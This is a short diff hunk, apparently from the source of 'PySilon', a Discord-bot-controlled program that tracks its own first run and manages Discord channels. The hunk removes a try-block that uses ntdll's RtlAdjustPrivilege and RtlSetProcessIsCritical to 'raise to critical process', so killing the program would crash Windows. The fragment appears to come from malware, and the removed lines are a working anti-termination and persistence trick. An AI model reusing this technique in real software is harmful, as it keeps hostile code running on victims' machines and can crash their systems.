@@ -136,12 +136,6 @@ async def on_ready():
 
     if not first_run:
         #.log PySilon is not running for the first time
-        try:
-            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
-            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-        except:
-            pass
-        #.log Raise to critical process
         category_channel_names = []
         for channel in category.channels:
             category_channel_names.append(channel.name)
